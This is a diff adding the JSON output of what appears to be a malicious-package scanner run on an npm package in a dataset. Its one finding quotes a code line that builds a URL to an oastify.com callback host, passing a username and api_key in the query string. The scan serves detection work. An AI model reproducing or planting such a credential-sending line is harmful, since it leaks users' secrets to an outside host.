@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": {},
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/index.js:12",
+                "code": "      \"https://xtugq3x7s01s5lag7ttiaipjza51trhg.oastify.com/api/v1/json/contest/?username=\" + username + \"&api_key=\" + api_key + \"&limit=20&end__gt=2020-09-19T00%3A00%3A00\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/ta123123-1.0.0"
+}
